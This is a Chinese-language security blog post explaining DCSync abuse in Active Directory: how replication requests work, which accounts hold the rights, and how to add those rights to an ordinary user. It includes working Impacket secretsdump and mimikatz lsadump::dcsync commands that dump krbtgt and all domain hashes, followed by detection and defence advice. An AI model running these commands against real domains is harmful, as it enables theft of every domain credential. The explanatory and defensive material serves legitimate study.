# 滥用DCSync

  
  
&lt;!--more--&gt;  
## 0x00 前言  
在域中，不同的域控之间，默认每隔15分钟会进行一次域数据的同步。当一个额外域控想从其他域控同步数据时，额外域控会向其他域控发送请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务(Directory Replication Service,DRS)的`GetNCChangeds`接口向域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成，分别是drsuapi和dsaop。  
在DCSync功能出现之前，要想获得域用户的hash等数据，需要登录域控并在其上执行操作才能获得域用户的数据。2015年8月，新版的mimikatz增加了DCSync功能，他有效地模拟了一个域控，并向目标域控请求账户哈希等数据。  
## 0x01 DCSync的工作原理  
DCSync是如何工作的呢？总的来说分为如下两步  
- 在网络中发现域控  
- 利用目录复制的GetNCChanges接口向域控发起数据同步请求。  

下面来看看详细的工作过程。  
当一个域控(我们称之为客户端)希望从另一个域控(我们称之为服务端)获得活动目录对象更新时，客户端域控向服务端域控发起DRSGetNCChanes请求。该请求的响应包含一组客户端必须应用于其复制副本的更新。如果更新集太大，可能只有一条响应信息。在这种情况下，将完成多个DRSGetNCChanes请求和响应。这个过程被称为复制周期或简单的循环。  
当服务端域控收到复制同步请求时，然后对执行复制的每个客户端域控来说，它会执行一个复制周期。这类似于在客户端中使用DRSGetNCChanes请求。  
## 0x02 修改DCSync ACL  
什么用户才具有运行DCSync的权限？能不能通过修改普通用户的ACL使其获得DCSync的权限呢？  
### 具有DCSync权限的用户  
运行DCSync需要具有特殊的权限，默认情况下，只有以下组中的用户具有运行DCSync的权限。  
- Administrators组内的用户  
- Domain Admins组内的用户  
- Enterprise Admins组内的用户  
- 域控计算机账户  

使用ADfind执行如下命令查询域内具有DCSync权限的用户  
`AdFind.exe -s subtree -b &#34;DC=xie,DC=com&#34; -sdna ntSecurityDescriptor -sddl&#43;&#43;&#43; -sddlfilter ;;;&#34;Replicating Directory Changes&#34;;; -recmute`  
### 修改DcSync的ACL  
如何能让普通域用户也获得DCSync的权限呢？只需要向普通域用户加下面两条ACL：  
- DS-Replcation-Get-Changes：复制目录更改权限，该权限只能从给定的域复制数据，不包括私密域数据。  
- DS-Replcation-Get-Changes-All:复制目录更改所有项权限，该权限允许复制给定的任意域中的所有数据，包括私密域数据。  

## 0x03 DCSync攻击  
如果拿到了具有DCSync权限的用户，就能利用DCSync功能从指定域控获得域内所有用户的凭据信息了。  
### Impacket  
`Impacket`下的`secretsdump.py`脚本可以通过DCSync功能导出域用户Hash，使用方法如下：  
`python3 secretsdump.py xie/hack:123456@10.211.55.4 -just-dc-user krbtgt`  
`python3 secretsdump.py xie/hack:123456@10.211.55.4 -just-dc`  
### mimikatz  
mimikatz也可以通过DCSync功能导出域用户的Hash，  
`lsadump::dcsync /domain:xie.com /user:krbtgt`  
`lasdump::dcsync /domain:xie.com /all /csv`  
### 0x04 DCSync攻击防御  
防守方如何针对DCSync攻击做检测和防御呢？  
**1. DCSync攻击防御**  
由于DCSync攻击的原理是模拟域控向另外的域控发起数据同步请求，因此，可以配置网络安全设备过滤流量并设置白名单，只允许白名单内的域控IP请求数据同步。  
**2. DCSync ACL滥用监测**  
1)可以在网络安全设备上监测来自白名单以外的域控数据同步复制。  
2)使用工具监测域内具备DCSync权限的用户。  
使用`Execute-ACLight2.bat`脚本文件进行监测，该工具输出的结果比较直观。  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E6%BB%A5%E7%94%A8dcsync/  

